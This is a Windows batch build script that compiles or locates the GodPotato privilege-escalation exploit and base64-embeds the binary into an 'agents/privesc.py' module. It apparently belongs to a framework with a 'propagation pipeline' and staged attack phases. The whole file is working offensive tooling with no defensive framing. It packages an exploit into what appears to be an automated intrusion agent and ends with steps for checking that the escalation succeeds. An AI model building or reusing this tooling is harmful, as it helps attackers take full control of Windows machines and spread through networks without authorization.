@echo off
REM Build automation for GodPotato embedding
REM Usage: build_embedded.bat <path_to_compiler> [GodPotato_source_dir]
REM
REM Example (if compiling GodPotato yourself):
REM   build_embedded.bat "C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Current\Bin\MSBuild.exe" "C:\src\GodPotato"
REM
REM Example (if GodPotato.exe already compiled):
REM   build_embedded.bat skip "C:\compiled\GodPotato.exe"

setlocal enabledelayedexpansion
set SCRIPT_DIR=%~dp0
set GODPOTATO_COMPILED=%SCRIPT_DIR%GodPotato.exe
set PRIVESC_PY=%SCRIPT_DIR%agents\privesc.py

echo.
echo ==========================================
echo GodPotato Embedding Build Automation
echo ==========================================
echo.

REM Step 1: Compile or locate GodPotato
if "%1"=="skip" (
    echo [1/3] Skipping compilation, using existing binary
    if exist "%2" (
        set GODPOTATO_COMPILED=%2
        echo [+] Found: !GODPOTATO_COMPILED!
    ) else (
        echo [-] Error: %2 not found
        exit /b 1
    )
) else if not "%1"=="" (
    echo [1/3] Compiling GodPotato from source
    echo [*] Using MSBuild: %1
    if exist "%2\GodPotato.sln" (
        echo [*] Building %2\GodPotato.sln
        "%1" "%2\GodPotato.sln" /p:Configuration=Release /p:Platform=x64
        set GODPOTATO_COMPILED=%2\x64\Release\GodPotato.exe
    ) else (
        echo [-] Error: GodPotato.sln not found in %2
        exit /b 1
    )
) else (
    echo [1/3] Checking for pre-compiled GodPotato.exe
    if exist "!GODPOTATO_COMPILED!" (
        echo [+] Found: !GODPOTATO_COMPILED!
    ) else (
        echo [-] Error: GodPotato.exe not found
        echo [!] Download from: https://github.com/S3cur3th1sSh1t/GodPotato
        echo [!] Or provide path: build_embedded.bat skip "C:\path\to\GodPotato.exe"
        exit /b 1
    )
)

REM Step 2: Verify binary exists and get size
if not exist "!GODPOTATO_COMPILED!" (
    echo [-] Error: GodPotato binary not found at !GODPOTATO_COMPILED!
    exit /b 1
)

for %%A in ("!GODPOTATO_COMPILED!") do (
    set FILE_SIZE=%%~zA
    set FILE_SIZE_KB=!FILE_SIZE! bytes
)
echo [+] Binary size: !FILE_SIZE_KB!

REM Step 3: Embed into privesc.py
echo.
echo [2/3] Embedding into agents/privesc.py...
python "%SCRIPT_DIR%build_embed_godpotato.py" "!GODPOTATO_COMPILED!" "%PRIVESC_PY%"
if errorlevel 1 (
    echo [-] Embedding failed
    exit /b 1
)

REM Verify import base64
echo.
echo [3/3] Verifying imports...
findstr /M "^import base64" "%PRIVESC_PY%" >nul
if errorlevel 1 (
    echo [!] Adding 'import base64' to privesc.py
    powershell -Command "(Get-Content '%PRIVESC_PY%') -replace '^import os', 'import base64`nimport os' | Set-Content '%PRIVESC_PY%'"
)

echo.
echo ==========================================
echo [✓] Build Complete!
echo ==========================================
echo.
echo Next steps:
echo 1. Test escalation:
echo    python test_propagation_pipeline.py
echo.
echo 2. Check GodPotato is embedded:
echo    python -c "from agents.privesc import WindowsPrivesc; print('GODPOTATO_BINARY size:', len(WindowsPrivesc.GODPOTATO_BINARY))"
echo.
echo 3. Monitor Phase 5 output for "GodPotato SUCCESS"
echo.

endlocal
